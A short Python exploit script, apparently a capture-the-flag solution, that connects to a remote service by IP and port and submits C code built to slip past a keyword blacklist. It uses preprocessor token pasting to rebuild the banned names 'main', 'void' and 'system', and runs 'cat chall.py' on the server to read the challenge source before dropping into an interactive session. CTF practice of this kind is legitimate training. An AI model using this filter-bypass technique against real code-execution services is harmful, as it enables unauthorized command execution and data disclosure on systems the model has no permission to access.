from ptrlib import *

sock = Socket("211.239.124.246", 12406)

blacklist = ['main', 'exe', 'system', 'open', 'while', 'for', 'read', 'write', 'print', 'scan', 'local', 'fork', 'socket', 'connect', 'recv', 'send', 'listen', 'accept', 'bind', 'int', 'float', 'void', 'double', 'char', 'start', 'asm', 'get']
code = [
    '#include <stdio.h>',
    '#define func m##a##i##n',
    '#define pon v##o##i##d',
    '#define taro s##y##s##t##e##m',
    'pon func(pon) {',
    '  taro("cat chall.py");',
    '}',
]

for line in code:
    for word in blacklist:
        if word in line:
            print(word, line)
            exit(0)

sock.recvline()
sock.sendline("ptr-yudai")

sock.sendlineafter("enter?\n", str(len(code)))

for line in code:
    sock.sendlineafter(":", line)

sock.interactive()
